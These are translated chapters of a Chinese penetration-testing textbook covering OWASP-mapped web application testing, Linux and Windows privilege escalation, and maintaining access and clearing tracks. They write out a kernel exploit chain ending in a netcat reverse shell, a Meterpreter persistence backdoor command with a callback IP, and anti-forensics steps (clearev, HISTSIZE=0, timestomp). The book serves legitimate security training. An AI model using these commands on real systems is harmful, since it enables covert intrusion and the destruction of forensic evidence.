很久以前，组织通常部署和使用厚客户端。然而，现在，随着我们更多地向移动性和便捷访问转变，薄客户端（网络应用程序）需求量很高。一旦托管，同一个网络应用程序可以通过多个端点访问，如 PC、智能手机、平板电脑等。但这肯定增加了风险因素。即使网络应用程序中存在一个漏洞，也可能对整个组织产生毁灭性影响。此外，随着网络和基础设施安全的发展，网络应用程序成为入侵者获取组织内部访问权限的易目标。网络应用安全测试远不止是运行自动化扫描程序来发现漏洞。自动化扫描程序不会考虑程序方面，并且也会报告许多误报。

# 应用程序配置文件

企业组织可能拥有大量为服务各种业务目的而设计和构建的应用程序。这些应用程序可能是小型的或复杂的，并且可能使用各种技术构建。现在，当需要设计和实施企业范围的应用程序安全程序时，决定评估的优先级就变得非常关键。可能总共有 100 个应用程序；然而，由于资源有限，可能无法在特定时间内测试所有 100 个应用程序。这就是应用程序配置文件派上用场的时候。

应用程序配置文件包括将应用程序分类为高、中和低等不同关键性组别。一旦分类，就可以根据应用程序所属的组别决定评估优先级。帮助分类应用程序的一些因素如下：

+   应用程序的类型是什么（厚客户端还是薄客户端还是移动应用）。

+   访问方式是什么（互联网/内联网）。

+   应用程序的用户是谁？

+   使用该应用程序的用户数量大约是多少？

+   应用程序是否包含任何业务敏感信息？

+   应用程序是否包含任何**个人可识别信息**（**PII**）？

+   应用程序是否包含任何**非公开信息**（**NPI**）？

+   是否有与应用程序相关的任何监管要求？

+   应用程序用户在应用程序不可用的情况下可以维持多长时间？

前述问题的答案可以帮助分类应用程序。应用程序分类也可以帮助有效评分漏洞。

# 常见的网络应用安全测试工具

进行网络应用安全测试有大量可用的工具。其中一些是免费/开源的，而另一些是商业可用的。以下表格列出了一些基本工具，可以有效地用于进行网络应用安全测试。这些工具中的大多数都是 Kali Linux 默认安装的一部分：

| **测试** | **所需工具** |
| --- | --- |
| 信息收集 | Nikto，网页开发者插件，Wappalyzer |
| 认证 | ZAP，Burp Suite |
| 授权 | ZAP，Burp Suite |
| 会话管理 | Burp Suite 网页开发者插件，OWASP CSRFTester，WebScarab |
| 输入验证 | XSSMe，SQLMe，Paros，IBM AppScan，SQLMap，Burp Suite |
| 配置错误 | Nikto |
| 业务逻辑 | 使用 ZAP 或 Burp Suite 进行手动测试 |
| 审计和日志记录 | 手动评估 |
| Web 服务 | WSDigger，IBM AppScan Web 服务扫描仪 |
| 加密 | 哈希标识符，弱密码测试器 |

# 身份验证

身份验证是建立或确认某事（或某人）的真实性或真实性的行为。身份验证取决于一个或多个身份验证因素。测试身份验证模式意味着理解和可视化身份验证工作的整个过程，并利用这些信息来发现身份验证机制实施中的漏洞。破坏身份验证系统会使攻击者直接进入应用程序，使其进一步暴露于各种攻击。

接下来的部分描述了一些重要的身份验证测试。

# 通过安全通道的凭据

这确实是一个非常基本的检查。应用程序必须严格通过安全的 HTTPS 协议传输用户凭据和所有敏感数据。如果应用程序使用 HTTP 传输用户凭据和数据，那么它容易受到窃听。我们可以通过检查 URL 栏来快速检查网站是否使用 HTTP 或 HTTPS，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/26c9bd95-8b40-4cd5-9643-c4311cf2e885.jpg)

此外，我们还可以检查证书详细信息以确保 HTTPS 实施，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/d2243089-c7b2-4753-a783-307d5b827e00.jpg)

# 身份验证错误消息

在应用程序登录页面上经常出现身份验证失败会显示不必要的信息。例如，用户输入错误的用户名和密码，然后应用程序抛出一个错误，说找不到用户名。这会显示给攻击者给定的用户是否属于应用程序。攻击者可以简单地编写一个脚本来检查 1,000 个用户的有效性。这种攻击称为用户枚举。因此建议身份验证失败消息应该是通用的，不应该透露用户名/密码是否错误。例如*用户名/密码错误*这样的通用消息并不能证明用户名是否属于应用程序。

# 密码策略

密码策略是与身份验证相关的一个微不足道的安全控制。密码通常容易受到字典攻击、暴力攻击和猜测密码攻击。如果应用程序允许设置弱密码，那么它们很容易被破坏。强密码策略通常具有以下条件：

+   最小长度为 8

+   必须至少包含 1 个小写字符、1 个大写字符、1 个数字和 1 个特殊字符。

+   密码最小年龄

+   密码最大年龄

+   密码历史限制

+   帐户锁定

重要的是要注意密码策略必须在客户端和服务器端都执行。

# 提交凭据的方法

GET 和 POST 是用于通过 HTTP/HTTPS 协议提交用户数据的两种方法。安全应用程序总是使用 POST 方法传输用户凭据和敏感用户数据。如果使用 GET 方法，则凭据/数据将成为公开可见的 URL 的一部分，并且很容易受到攻击。

以下图像显示了典型的登录请求和响应，并突出了 POST 方法的使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/6b53df1c-8282-413f-856f-9b2d85cc3f68.png)

# OWASP 映射

身份验证相关的漏洞是 OWASP Top 10 2017 的一部分。它们包括在 A2:2017 Broken Authentication 下。在这个类别下列出的一些漏洞如下：

+   应用程序允许自动攻击，如凭据填充

+   应用程序允许暴力攻击

+   应用程序允许用户设置默认、弱或知名密码

+   应用程序具有弱密码恢复过程

# 授权

一旦用户被验证，下一个任务就是授权用户以允许他/她访问数据。根据用户角色和权限，应用程序授予授权。要测试授权漏洞，我们需要来自应用程序中不同角色的有效凭据。使用一些初步工具，我们可以尝试绕过授权模式并使用普通用户的凭据访问超级用户帐户。

# OWASP 映射

授权相关的漏洞是 OWASP 2017 年十大漏洞之一。它们包含在 A5:2017 破坏访问控制下。此类别下列出的一些漏洞如下：

+   通过篡改 URL 绕过访问控制检查

+   允许将主键更改为另一个用户的记录，并允许查看或编辑其他人的帐户

+   提升权限

# 会话管理

会话管理是任何基于 Web 的应用程序的核心。它定义了应用程序如何维护状态，从而控制用户与站点的交互。会话在用户最初连接到站点时启动，并且预期在用户断开连接时结束。由于 HTTP 是一种无状态协议，会话需要由应用程序显式处理。通常使用唯一标识符，如会话 ID 或 cookie 来跟踪用户会话。

# Cookie 检查

由于 cookie 是存储用户会话信息的重要对象，因此必须进行安全配置。下图显示了一个带有其属性的示例 cookie：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/95f7f125-b43d-453a-ba35-bc2e5701bdb4.jpg)

在上图中，最后三个参数从安全的角度来看是重要的。Expires 参数设置为 At end of session，这意味着 cookie 不是持久的，一旦用户注销就会被销毁。Secure 标志设置为 No，这是一个风险。站点应该实现 HTTPS，然后启用 Secure cookie 标志。HTTPOnly 标志设置为 Yes，这可以防止其他站点未经授权地访问 cookie。

# 跨站请求伪造

跨站请求伪造是针对 Web 应用程序的常见攻击，通常是由于弱会话管理而发生。在 CSRF 攻击中，攻击者向受害者发送一个特制的链接。当受害者点击攻击者发送的链接时，它会触发易受攻击的应用程序中的一些恶意操作。反 CSRF 或 CAPTCHA 是一些常见的防御措施。OWASP 有一个特殊的工具来测试应用程序是否容易受到 CSRF 攻击。它可以在[`www.owasp.org/index.php/File:CSRFTester-1.0.zip`](https://www.owasp.org/index.php/File:CSRFTester-1.0.zip)找到。

OWASP CSRF 测试工具捕获应用程序请求，然后生成 CSRF 概念验证，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/f91cea07-638f-4a95-8eee-3b9d5eb16bfc.png)

# OWASP 映射

会话管理相关的漏洞是 OWASP 2017 年十大漏洞之一。它们包含在 A2:2017 破坏身份验证下。此类别下列出的一些漏洞如下：

+   生成的会话 ID 不是唯一的、随机的、复杂的，容易被猜测

+   应用程序在 URL 或审计日志文件的一部分中暴露会话标识符

+   应用程序容易受到重放攻击

+   应用程序容易受到跨站请求伪造攻击

# 输入验证

不正确的输入验证是大多数 Web 应用程序中最常见和固有的缺陷之一。

这种弱点进一步导致 Web 应用程序中许多关键漏洞，如跨站脚本、SQL 注入、缓冲区溢出等。

大多数情况下，当应用程序被开发时，它会盲目接受所有传入的数据。然而从安全的角度来看，这是一种有害的做法，因为由于缺乏适当的验证，恶意数据也可能进入。

# OWASP 映射

输入验证相关的漏洞是 OWASP Top 10 2017 的一部分。它们包括 A1:2017 注入，A4:2017-XML 外部实体（XXE），A7:2017-跨站脚本（XSS）和 A8:2017-不安全反序列化。此类别下列出的一些漏洞如下：

+   应用程序未在客户端和服务器端验证输入。

+   应用程序允许有害的黑名单字符（&lt;&gt;;’”!()）。

+   应用程序容易受到注入漏洞的攻击，如 SQL 注入、命令注入、LDAP（轻量级目录访问协议）注入等。

+   应用程序容易受到跨站脚本攻击。下图显示了反射型跨站脚本攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/6b38a077-8e73-4a35-8317-0f181445e22a.jpg)

+   应用程序容易受到缓冲区溢出的攻击。

# 安全配置错误

我们可能会花费大量精力来保护应用程序。然而，应用程序不能孤立运行。运行应用程序需要大量的支持组件，如 Web 服务器、数据库服务器等。如果应用程序与所有这些支持组件没有安全配置，将为潜在攻击者打开许多漏洞。因此，应用程序不仅应该安全地开发，还应该安全地部署和配置。

# OWASP 映射

安全配置相关的漏洞是 OWASP Top 10 2017 的一部分。它们包括 A6:2017 安全配置错误。此类别下列出的一些漏洞如下：

+   应用程序堆栈上未进行安全加固。

+   启用或安装不必要或不需要的功能（例如端口、服务、管理页面、帐户或权限）。下图显示了默认的 Tomcat 页面，所有用户都可以访问：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/2deb764d-21c4-4f7e-be33-5bcb24ab5eba.png)

+   应用程序默认帐户处于活动状态，并使用默认密码。

+   不当的错误处理会显示堆栈跟踪和内部应用程序信息，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/077cbef2-db3d-449e-824b-5a232e2d7386.png)

+   应用程序服务器、应用程序框架（例如 Struts、Spring、ASP.NET）、库、数据库等未进行安全配置。

+   应用程序允许目录列表，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/84ce8095-c4f9-4d13-acb8-e6a89d072bf6.png)

Nikto 是一个优秀的工具，用于扫描安全配置问题，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/a4f91dd2-10da-439d-82c9-976e32765b66.png)

# 业务逻辑缺陷

业务逻辑是应用程序的核心，决定应用程序的预期行为。业务逻辑主要源自应用程序的目标/目的，并主要包含在应用程序的服务器端代码中。如果业务逻辑存在缺陷或不足，攻击者可能会严重滥用。自动化安全扫描工具实际上无法找到与业务逻辑相关的问题，因为它们无法像人类那样理解应用程序的上下文。因此，除了严格的验证外，还绝对需要无懈可击的业务逻辑，以构建安全的 Web 应用程序。

# 测试业务逻辑缺陷

如前所述，无法使用自动化工具全面测试与业务逻辑相关的缺陷。以下是一些测试业务逻辑的指导方针：

+   与应用程序架构师、应用程序的业务用户和开发人员进行头脑风暴会议，了解应用程序的全部内容

+   了解应用程序中的所有工作流程

+   记录应用程序可能出错并产生较大影响的关键领域

+   创建样本/原始数据，并尝试从普通用户和攻击者的角度探索应用程序

+   制定攻击方案和逻辑测试，以测试特定业务逻辑

+   创建全面的威胁模型

**业务逻辑缺陷示例**

考虑一个电子商务网站，销售电视机顶盒充值券。它连接到外部支付网关。现在用户在电子商务网站上选择充值金额，然后电子商务网站将用户转到支付网关进行付款。如果付款成功，支付网关将向电子商务网站返回一个成功标志，然后电子商务网站将在系统中实际发起用户请求的充值。现在假设攻击者选择购买价值 X 美元的充值，并前往支付网关，但在返回电子商务网站时，他篡改了 HTTP 请求，并将金额设置为 X+10 美元。在这种情况下，电子商务网站可能会接受该请求，认为用户实际支付了 X+10 美元而不是 X 美元。这是一个简单的业务逻辑缺陷，由于电子商务网站和支付网关之间的不正确同步而发生。两者之间的简单校验和机制可以防止这样的缺陷。

# 审计和日志记录

检查应用程序审计日志的完整性是应用程序安全评估中最重要的程序方面之一。审计日志被归类为侦探控制，在安全事件发生时非常有用。企业应用程序通常具有复杂的性质，并与其他系统（如数据库服务器、负载均衡器、缓存服务器等）相互连接。在发生违规行为时，审计日志在重建事件场景中起着最重要的作用。缺乏详细信息的审计日志将极大地限制事件调查。因此，必须仔细检查应用程序生成事件日志的能力，以找出任何适用的缺陷。

# OWASP 映射

审计和日志记录相关的漏洞是 OWASP Top 10 2017 的一部分。它们包括 A10:2017 不足的日志记录和监控。此类别下列出的一些漏洞如下：

+   应用程序未记录登录、登录失败和高价值交易等事件

+   应用程序生成警告和错误，这是不足的

+   应用程序和 API 日志未定期监控可疑活动

+   未定义应用程序日志的备份策略

+   应用程序无法实时或几乎实时地检测、升级或警报活动攻击

# 密码学

我们知道，加密有助于保持数据的机密性；它在 Web 应用程序安全中也扮演着重要的角色。在构建安全的 Web 应用程序时，必须同时考虑*数据在静态状态下的加密*和*数据在传输中的加密*。

# OWASP 映射

与加密相关的漏洞是 OWASP Top 10 2017 的一部分。它们包括 A3:2017 敏感数据暴露。此类别下列出的一些漏洞如下：

+   以明文传输数据的应用程序。这涉及到诸如 HTTP、SMTP 和 FTP 等协议。

+   应用程序使用旧的或弱加密算法。

+   应用程序使用默认加密密钥。

+   应用程序未强制加密。

+   应用程序在存储时未加密用户敏感信息。

+   应用程序使用无效的 SSL 证书。

Qualys 提供了一个出色的在线工具，用于测试 SSL 证书。以下图片显示了 Qualys SSL 测试的样本结果，可以在[`www.ssllabs.com/ssltest/`](https://www.ssllabs.com/ssltest/)上访问：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/70c9a8ef-6206-4156-adf4-6d146bfd84a5.png)

网站的一些其他结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/378a570c-6572-4922-8947-076585d2a5fb.jpg)

# 测试工具

在本章的前面，我们已经看到了一系列可以用于进行 Web 应用程序安全测试的各种工具。在本节中，我们将简要介绍其中两种工具。

# OWASP ZAP

OWASP ZAP 是一个多功能工具，可以执行与应用程序安全测试相关的一系列任务。它也能够进行自动化扫描，并且在手动测试和模糊测试方面非常有效。OWASP ZAP 可以从[`www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project`](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project)下载。

以下图片显示了初始的 OWASP ZAP 控制台。左窗格显示站点层次结构，右窗格显示单独的请求和响应，底窗格显示主动扫描：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/34fcf979-f0ae-4ba7-b152-123df898b136.png)

我们可以首先爬取应用程序，也可以直接输入要攻击的 URL，如下图所示。我们可以在底部窗格中看到主动扫描，一旦完成，我们可以简单地点击“报告”菜单，然后选择生成 HTML 报告。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/81835fb6-a7c9-4d56-9e1f-89b90ec670e1.png)

# Burp Suite

BurpSuite 是一个非常灵活和强大的工具，用于进行 Web 应用程序安全测试。它可以免费下载，也有商业版本。Burp Suite 可以从[`portswigger.net/burp/communitydownload`](https://portswigger.net/burp/communitydownload)下载。

以下图片显示了初始的 Burp Suite 控制台：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/10f8ea17-4bd0-4098-babb-5d08f6331a95.png)

BurpSuite 具有以下各种功能：

+   **代理**：它充当拦截代理，并允许编辑所有应用程序请求。

+   **蜘蛛**：它会自动爬取应用程序范围内的内容，并为进一步测试创建应用程序层次结构。

+   **扫描器**：它在目标应用程序上运行预定义的安全测试，并生成漏洞报告。此功能仅在商业版本中可用。

+   **入侵者**：这个功能可以有效地用于模糊应用程序中的各种输入字段。

+   **重复器**：这可以用于多次发送特定请求并分析响应。

+   **解码器**：这可以用于解码各种格式的内容，如 Base64 等。

+   **扩展器**：这可以用于向 Burp Suite 添加额外的扩展。

# 总结

在本章中，我们学习了 Web 应用程序安全的各个方面，将它们与 Burp Suite OWASP 十大进行了映射，并简要介绍了可以用于进行 Web 应用程序安全测试的各种工具。


# 第十六章：权限升级

在上一章中，我们学习了有关 Web 应用程序安全的各个方面。在本章中，我们将讨论与权限升级相关的各种概念。我们将熟悉各种权限升级概念，以及在受损的 Windows 和 Linux 系统上提升权限的实际技术。

我们将在本章中涵盖以下主题：

+   定义权限升级

+   水平与垂直权限升级

+   Windows 上的权限升级

+   Linux 上的权限升级

# 什么是权限升级？

在我们深入讨论权限升级的任何技术细节之前，让我们首先对权限有一些基本的了解。单词*privilege*的字面字典意思是特权、优势或豁免，只授予或仅对特定人或团体可用。在计算世界中，权限是由操作系统管理的。在单个系统上可能有十个用户，但并非所有用户都具有相同级别的权限。根据安全最佳实践，通常遵循最小权限原则。这意味着每个用户只被分配绝对必要的最低权限来执行其任务。这个原则有助于消除滥用不必要的过多权限的可能性。

在安全评估的背景下，权限升级变得非常重要。假设您成功地利用了远程系统中的漏洞并获得了 SSH 访问权限。但是，由于您已经妥协的用户权限有限，您的操作受到了限制。现在，您肯定希望拥有最高级别的权限，以便您可以探索受损系统的各个方面。权限升级将普通用户的权限提升到具有最高权限的用户。完成后，您将完全控制受损的系统。

要了解权限如何工作的一些基础知识，以下图表显示了各种保护环：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/0e6b2097-2f41-49ae-bbd9-a5486745d594.png)

这张图表显示了四个环：

+   **环 0**：属于操作系统的内核，具有最高的权限。

+   **环 1 和环 2**：主要由设备驱动程序使用，它们在操作系统和各种硬件设备之间进行接口。这些环具有很好的权限，但低于**环 0**。

+   **环 3**：大多数我们的最终应用程序运行的地方。它们拥有最低的权限。

因此，在权限升级的情况下，如果您想利用应用程序漏洞并访问**环 3**，那么您需要找到一种方法将权限提升到更高的环。在 Windows 环境中，具有最高权限的用户通常被称为**管理员**，而在 Linux 环境中，具有最高权限的用户被称为**root**。

# 水平与垂直权限升级

正如我们在前一节中看到的，权限升级意味着获得未经授权的权限。权限升级可以是水平或垂直的两种类型之一。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/b7acdb54-474e-4268-ab6b-af1b8fc3d1d5.png)

# 水平权限升级

参考前面的图表；总共有四个用户：三个普通用户和一个管理员。用户按照其层次显示。现在，如果**普通用户 1**能够访问**普通用户 2**的数据，这将被称为水平权限升级，因为两个用户在层次结构中处于相同的级别。

# 垂直权限升级

关于前面的图表，如果**普通用户 1**能够访问数据并获得**管理员**的权限，这将被称为垂直权限升级。**普通用户 1**和**管理员**在层次结构中处于不同的级别。

# Windows 上的权限升级

正如我们在前一节中看到的，在 Windows 系统上，拥有最高特权的用户被称为**管理员**。一旦我们使用任何可用的利用程序来入侵系统，我们的目标应该是将用户特权提升到管理员级别。

下面的截图显示了对 Windows XP 目标利用`ms08_067_netapi`漏洞的过程。Metasploit 成功利用了漏洞，并提供了一个 meterpreter 会话，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/727e96bb-8f37-40c2-937d-82ba2794e9ad.png)

Meterpreter 为我们提供了提升特权的能力。`getsystem`命令专门用于提升已受损的 Windows 系统的特权。下面的截图显示了使用`getsystem`命令以获取目标系统上管理员级别特权的过程：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/c8ecb3ab-e892-4a6e-8308-2c6bc0a68e24.png)

# 在 Linux 上的特权升级

在本节中，我们将看到如何利用 Linux 系统中的漏洞，然后提升我们的特权。我们将使用 Metasploitable 2 作为我们的目标。

在我们甚至考虑提升特权之前，我们必须至少具有对目标系统的普通级别访问权限。在这种情况下，我们的目标系统的 IP 地址是`192.168.25.129`。我们首先启动 SPARTA，以快速收集有关我们目标的一些信息。我们将目标 IP 添加到 SPARTA 扫描的范围内，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/172b285b-f4c1-4034-bfc3-1359c8b8d845.png)

一旦 SPARTA 扫描完成，我们就可以知道目标系统上运行着哪些服务。现在我们发现目标系统正在运行一个名为`distccd`的服务（如下面的截图所示），这是一个用于源代码编译的分布式计算应用程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/85a5c835-ce30-48ee-a9ad-555b680d763f.png)

现在我们知道要利用的服务，我们将打开 Metasploit 控制台，查找与`distcc`相关的任何利用程序。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/d12e255e-05cc-43bf-9c9b-6a370e251855.png)

我们得到一个名为`distcc_exec`的利用程序，在 Metasploit 中已经准备好。现在我们使用`show options`命令查找需要配置的参数。然后我们设置`RHOST`（目标）参数的值，并执行`exploit`命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/38874d81-4c43-4c23-bea7-fee0e81e9a57.png)

利用成功，并为我们提供了一个远程命令 shell。但是，该 shell 的特权有限，现在我们需要提升特权到 root。使用`uname`命令，我们得知目标基于 Linux 内核 2.6.X。因此，我们需要找出适合该内核版本的特权提升利用程序。我们可以使用`searchsploit`实用程序搜索特定的利用程序。以下命令将列出我们需要的利用程序：

```
searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6 | grep 8572
```

现在我们可以在目标系统上使用`wget`命令下载利用程序，如下面的截图所示。下载后，我们使用以下命令在本地编译利用程序：

```
gcc -o exploit 8572.c 
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/11ccd073-b969-45ca-b3b6-d22fac1f374a.png)

在我们的 Kali Linux 系统上，我们使用以下命令在端口`12345`上启动 Netcat 监听器：

```
nc -lvp 12345
```

一旦在目标系统上执行了利用程序，我们就会在 Kali 系统上获得一个具有 root 权限的反向 shell，如下面的截图所示。因此，我们已成功将权限从普通用户提升为 root：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/6b996677-1aec-49e6-a422-aba2bce85f56.png)

# 总结

在本章中，我们了解了特权在各种平台（如 Windows 和 Linux）上的重要性，以及在渗透测试期间提升特权的相关性。


# 第十七章：维持访问和清除痕迹

在上一章中，我们学习了特权升级概念以及实际的升级技术。

在本章中，我们将学习如何在被妥协的系统上保持访问并使用反取证技术清除痕迹。我们将学习如何在被妥协的系统上建立持久后门，并使用 Metasploit 的反取证能力来清除渗透痕迹。

在本章中，我们将涵盖以下主题：

+   维持访问

+   清除痕迹和路径

+   反取证

# 维持访问

到目前为止，在本书中，我们已经看到了渗透测试的各个阶段。所有这些阶段都需要大量的时间和精力。假设你正在对一个目标进行渗透测试，并且已经努力通过 Metasploit 获得了远程系统访问。你希望在任务继续进行的几天内保持这种辛苦获得的访问。然而，在这段时间内，被妥协的系统是否会重新启动并没有保证。如果重新启动，你的访问将会丢失，你可能需要再次努力获得相同的访问权限。这正是我们希望在被妥协的系统中保持或持续访问的确切场景。

Metasploit 提供了一些出色的内置机制，可以帮助我们保持对被妥协系统的持久访问。第一步将是利用针对易受攻击的目标系统的合适漏洞，并获得 Meterpreter 访问，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/b2851627-c0a8-49fd-ae4a-d4bad9f6ab73.png)

一旦利用成功，我们就可以获得对远程系统的 Meterpreter 访问。Metasploit 中的 Meterpreter 提供了一个名为`persistence`的实用程序，它可以帮助我们在受损系统上安装一个永久后门。我们可以使用`run persistence -h`命令了解更多关于`persistence`实用程序的信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/33782514-af5a-4d03-ba41-9d06880628bb.png)

现在我们执行`persistence`命令：

```
meterpreter >run persistence –A –L c:\\ -X 60 –p 443 –r 192.168.25.130
```

这个命令将执行`persistence`脚本并启动一个匹配的处理程序(`-A`)，将 Meterpreter 放在目标系统的`c:\\`位置(`-L c:\\`)，系统启动时自动启动监听器(`-X`)，每 60 秒检查一次连接(`60`)，在端口`443`上连接(`-p 443`)，并在 IP 地址`192.168.25.130`上回连到我们。

`persistence`脚本的执行输出如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/56119311-b4c1-483d-b8a7-b8957aa3c1cb.png)

现在`persistence`脚本已成功安装在目标系统上，我们不需要担心重新启动。即使目标系统重新启动，无论是故意还是意外，`persistence`脚本都会自动重新连接到我们，再次给我们 Meterpreter 访问权限。

# 清除痕迹和路径

渗透测试由一系列复杂的任务对目标系统执行而成。执行这些任务会以多种方式影响目标系统。多个配置文件可能会被修改，许多审计记录可能会被记录在日志文件中，对于 Windows 系统，注册表可能会发生变化。所有这些变化可能帮助调查人员或蓝队成员追溯攻击向量。

完成渗透测试后，清除所有在妥协过程中使用的残留文件是很好的。但是，这需要与蓝队达成一致。清除所有痕迹的另一个目的可能是测试组织的事后响应方法。然而，现实世界的攻击者可能会简单地利用这一点来掩盖他们的痕迹并保持不被发现。

Metasploit 具有一些帮助清除痕迹的能力。首先，我们需要利用一个漏洞并给予 Meterpreter 对目标的访问：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/b4b9c3e8-0a35-43c7-89a5-a005d39b34ca.png)

以下截图显示了我们目标系统上的应用程序事件日志：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/859e6c25-02ed-4a4f-aa7f-836700e5be7c.png)

以下截图显示了我们目标系统上的`System`事件日志：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/d874c0a5-b473-4d67-ac9a-08eb488805be.png)

现在我们已经给予 Meterpreter 对目标系统的访问权限，我们将使用`getsystem`命令将权限提升到管理员级别。Meterpreter 有一个名为`clearev`的实用程序，用于擦除目标系统上的审计记录。当我们执行`clearev`时，目标上的所有审计记录都被擦除：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/d9af5879-b8c8-4663-a119-06756ff7c95e.png)

以下截图显示，由于`clearev`擦除了应用程序事件日志，因此没有应用程序事件日志：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/43af6a3f-66f7-4d6c-97d7-9fb54a1229c4.png)

以下截图显示，由于`clearev`擦除了系统事件日志，因此没有系统事件日志：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/584ee98d-d327-4501-a7c7-3527a8dfb78c.png)

同样，在具有 Linux 操作系统的目标上，我们可以做一些事情来清除我们的痕迹。Linux 终端维护命令历史记录，可以使用`history`命令查看：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/a3565782-5d49-40e3-bc10-7d4be4436499.png)

在 Linux 系统（基于 Debian 的系统）中，负责控制命令历史记录的参数是`$HISTSIZE`。如果我们能够将其值设置为`0`，就不会存储任何命令历史记录：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/d8ea765e-028f-4410-8cd5-3aefe4474b63.png)

# 反取证

在前一节中，我们看到渗透测试任务留下了多个痕迹。事后取证调查可以揭示有关妥协发生方式的许多信息。进行取证分析时的一个重要因素是时间戳。文件时间戳有助于重建可能发生的一系列活动。

Metasploit 提供了能够有效用于覆盖时间戳值并误导取证调查的功能。

首先，我们利用漏洞针对目标使用 Meterpreter 访问。然后我们使用`timestomp <filename> -v`命令列出与文件相关的各种时间戳：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/9eb1336c-08a4-4383-bef5-962afcf88a93.png)

现在，我们可以尝试使用`timestamp <filename> -b`命令擦除文件的时间戳。此命令将清除与目标文件相关的所有时间戳：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/sec-net-infra-nmap-nss7/img/7c098fc8-9bb8-4442-98c3-046974762c61.png)

# 总结

在本章中，我们学习了各种技术来持久访问受损目标。我们还学习了清除受损系统痕迹的各种方法，以及 Metasploit 框架的一些反取证能力。

在下一章中，我们将学习正确漏洞评分的重要性。


# 第十八章：漏洞评分

本章是关于理解正确漏洞评分的重要性。我们将了解标准漏洞评分的需求，并获得使用**通用漏洞评分系统**（CVSS）对漏洞进行评分的实际知识。

本章将涵盖以下主题：

+   漏洞评分的要求

+   使用 CVSS 进行漏洞评分

+   CVSS 计算器

# 漏洞评分的要求

拿任何现代网络进行漏洞扫描。你会感到不知所措，并发现大量的漏洞。现在，如果你继续对网络进行扫描，比如每月一次，那么你的漏洞清单将迅速增长。如果将所有这些漏洞如实呈现给高级管理人员，那将毫无帮助。高级管理人员更感兴趣的是一些具体的、可操作的信息。

典型的漏洞扫描器可能会在特定系统中发现 100 个漏洞。在 100 个漏洞中，可能有 30 个是误报，25 个是信息性的，25 个是低严重性的，15 个是中等严重性的，5 个是高严重性的漏洞。自然而然地，在 100 个报告的漏洞中，5 个高严重性的漏洞应该作为优先处理。其余的可以根据资源的可用性稍后处理。

因此，除非漏洞得分，否则无法为其分配严重性评级，因此也无法为其进行优先修复。高级管理人员也会对组织内的最高严重性漏洞感兴趣。因此，对漏洞进行评分将有助于获得高级管理人员在项目可见性和资源管理方面的正确关注和支持。如果不进行评分，将无法对漏洞进行优先处理和关闭。

